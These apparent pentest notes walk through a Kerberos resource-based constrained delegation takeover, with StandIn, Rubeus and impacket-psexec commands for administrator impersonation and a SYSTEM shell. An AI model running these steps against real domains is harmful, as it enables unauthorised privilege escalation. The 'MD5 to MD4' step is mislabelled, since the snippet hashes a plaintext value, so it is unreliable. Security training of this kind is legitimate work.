---
description: >-
  Gaining code execution with elevated privileges on a remote computer if you
  have WRITE privilege on that computer's AD object.
---

# Kerberos Resource-based Constrained Delegation: Computer Object Takeover

## Overview

* You need to have <mark style="color:yellow;">Write privilege on a Domain AD Object</mark>
* Examples include <mark style="color:yellow;">WriteAll</mark> or <mark style="color:yellow;">GenericAll</mark>!
* This usually stems from a user as we can see in the picture below

What does that look like in BloodHound?

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

* We can manipulate the target however we wish
* In other words, we can create or modify properties on the machine account

## BloodHound's Abuse Info (GenericAll)

* We can <mark style="color:yellow;">create a new machine account using a tool called</mark> <mark style="color:red;">**PowerMad**</mark>
* <mark style="color:yellow;">Modify the existing DC account so that it</mark> <mark style="color:red;">trusts</mark> <mark style="color:yellow;">our new machine account</mark>

### <mark style="color:yellow;">When we have Resource-Based Constrained Delegation...</mark>

* The computers specify WHICH machines they trust delegation authentication to
* Since we can write to the DC, we can tell the DC to trust our newly created/fake account
* Once we create the fake account, we can set <mark style="color:yellow;">msDS-AllowedToActOnBehalfOfOtherIdentity</mark> field of the computer account that we are taking over&#x20;
* The DC will trust this computer account with delegation
* We then use <mark style="color:yellow;">Rubeus</mark> to <mark style="color:yellow;">impersonate the Administrator on the DC</mark>
* We need PowerView, PowerMad, and Rubeus

### However, XCT has a better way!

* Upload <mark style="color:yellow;">Rubeus</mark> and <mark style="color:yellow;">StandIn</mark>
  * StandIn is a .NET native solution to perform resource-based constrained delegation

<mark style="color:yellow;">Rubeus:</mark>

{% embed url="https://github.com/GhostPack/Rubeus" %}

<mark style="color:yellow;">StandIn:</mark>

{% embed url="https://github.com/FuzzySecurity/StandIn/releases" %}

* Create a new computer account using StandIn

```
.\StandIn.exe --computer hacker --make
```

* Obtain SID

```
Get-ADComputer -Filter * | Select-Object Name, SID
```

* Set attribute with StandIn

```
.\StandIn.exe --computer COMPUTER_NAME_HERE --sid SID_HERE

AllowedToActOnBehalfOfOtherIdentity
```

* Use Python to convert MD5 to MD4

```
python3

import hashlib,binascii
hash = hashlib.new('md4', "PLACE_MD5_HASH_HERE".encode('utf-16le')).digest()
print(binascii.hexlify(hash))
```

* Now we can use Rubeus to craft a ticket to impersonate the administrator

```
.\Rubeus.exe s4u /user:hacker /rc4:MD4_HASH_HERE /impersonateuser:administrator /msdsspn:cifs/computer_name_here /nowrap /ptt

Ticket successfully imported
```

* Now check with klist

```
klist
```

* Unfortunately, we need to do this remotely, not locally
* Copy the ticket obtained from Rubeus above and copy it locally

```
subl ticket.b64 #Paste ticket in here

cat ticket.b64 | base64 -d > ticket.kirbi

impacket-ticketConverter ticket.kirbi ticket.ccache

export KRB5CCNAME='pwd'/ticket.ccache

klist #We can now see the ticket
```

* Lastly, we need to use the ticket!

```
impacket-psexec -k -no-pass domain.local/administrator@computer_name_here -dc-ip 192.168.114.175

C:\Windows\system32>
```

## Kerberos Delegation VS Resource-Based Constrained Delegation

* In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to
* In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them

## Reference

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" %}

{% embed url="https://www.youtube.com/watch?v=xMTCZt5DRB0" %}
